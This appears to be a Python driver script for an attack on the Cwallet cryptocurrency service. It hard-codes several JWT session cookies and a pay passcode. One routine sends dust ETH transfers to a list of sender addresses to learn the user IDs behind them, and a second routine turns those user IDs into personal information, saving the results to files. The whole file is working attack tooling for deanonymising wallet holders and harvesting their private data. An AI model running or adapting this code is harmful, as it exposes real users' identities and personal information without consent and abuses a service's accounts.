import asyncio
from script import executeAttack, executeUserIdToPII
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


def setup_logging(enabled: bool = True):
    if not enabled:
        logging.disable(logging.CRITICAL)
        return
    # Keep root logger quiet
    logging.getLogger().setLevel(logging.WARNING)

    # File handler
    handler = RotatingFileHandler(
        "cwallet_debug.log",
        maxBytes=2_000_000,
        backupCount=3
    )
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(name)s | %(message)s"
    )
    handler.setFormatter(formatter)

    # Attach ONLY to your module logger
    attack_logger = logging.getLogger("attack")
    attack_logger.setLevel(logging.DEBUG)
    attack_logger.addHandler(handler)

    # Silence noisy libraries explicitly
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("asyncio").setLevel(logging.WARNING)


async def userIdExtraction():
    # Cookies
    clients = []
    cookies = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2NXBkcGZzamZmN3lrZGVud3k5cW9pemg5NGEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDI3MjMsImlhdCI6MTc3MTgzMDcyM30.Pc8VsLkSU3Rx584fBAiAxBwizJKHGnPNdRAB0XFziME",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIxdDhrNzliNnM3eWl0ajlveWs1ZnRva3pvYyIsInNlc3Npb25faWQiOiI0MDk2cm1yM2lqemo0N3J3dGVuaWJweHFwNTUxZnkiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDk5NDQsImlhdCI6MTc3MTgzNzk0NH0.BUJSC2JnH_2RNV8ikfK2R27RmqwCcpXRz5JI-VGD9vM",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIzYzQ0eWZhanJ0eTRmamhydTV3aG43NjRjZSIsInNlc3Npb25faWQiOiI0MDk2NXFuOXkxeGlrZnJ4aXkzZ2Y4Nmp1am44Z2MiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTAxMTYsImlhdCI6MTc3MTgzODExNn0._Q_X3dj6XgYEvatE1M1KAbfDnA_obK7DdiB0VAuuKl8",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJiajh5ZnE5b3FmOHU1ZDVxd2NiOHgzenF5byIsInNlc3Npb25faWQiOiI0MDk2cjl3aHQzazZqM2ZpNWJhamh6NW1vNGhobnIiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTAyMjQsImlhdCI6MTc3MTgzODIyNH0.Q1vLO14dSnssCVwueSMwkYCAFl1kf-UnkjEVX3yFnmc",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjhkODhkZ3F5aGgzZ3d0Z3hjdWVqMWprd3dybyIsInNlc3Npb25faWQiOiI0MDk2N3BvaDdzZWR6M2d3M2JicGR3a2l4M2k5Z2MiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTA4MzIsImlhdCI6MTc3MTgzODgzMn0.n9x0musb5f__9G85rDD9bwCD7TbWBsPnr4qjPpryo14",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJmOWVtM3g5ZGVmeTVqZ3locXByb3EzanNpbyIsInNlc3Npb25faWQiOiI0MDk2enA3MzRrZG42cHIxdHE2aWM1cWI3NGRzZWEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTEwNzAsImlhdCI6MTc3MTgzOTA3MH0.74stdHBjrugCOls-str71B3zjzdyRpV2IKIXu3plwdM"
    ]
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))

    # Getting Addresses
    addressesFileName = "unique_senders_alchemy.txt"
    resultsFileName = "results_eth.txt"
    amount = "0.00000001"
    cryptoCoin = COINS["ETH"]

    await executeAttack(
        addressesFileName=addressesFileName,
        resultsFileName=resultsFileName,
        clients=clients,
        coin=cryptoCoin,
        amount=amount
    )

async def userDataExtraction():
    # Cookies
    clients = []
    cookies = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjgzOHRkcm5xdGpwZjRwa3hwcWg5NjhqM2E3aCIsInNlc3Npb25faWQiOiI0MDk2aWNmNWF1N29yaW56ZmZ4YXU1Y3k1b3pwMW8iLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUwOTE4NjEsImlhdCI6MTc3MjAxOTg2MX0.DOPdygehYqSnR11JtFwBnnkuURdmVS4RooTzoeW9YLs", # 10
    ]
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))

    # Getting Addresses
    userIdsFileName = "results_eth.txt"
    resultsFileName = "results_eth_two.txt"

    await executeUserIdToPII(
        userIdsFileName=userIdsFileName,
        resultsFileName=resultsFileName,
        clients=clients,
    )


async def main():
    # await userIdExtraction()
    await userDataExtraction()

if __name__ == "__main__":
    setup_logging(enabled=True)
    asyncio.run(main())
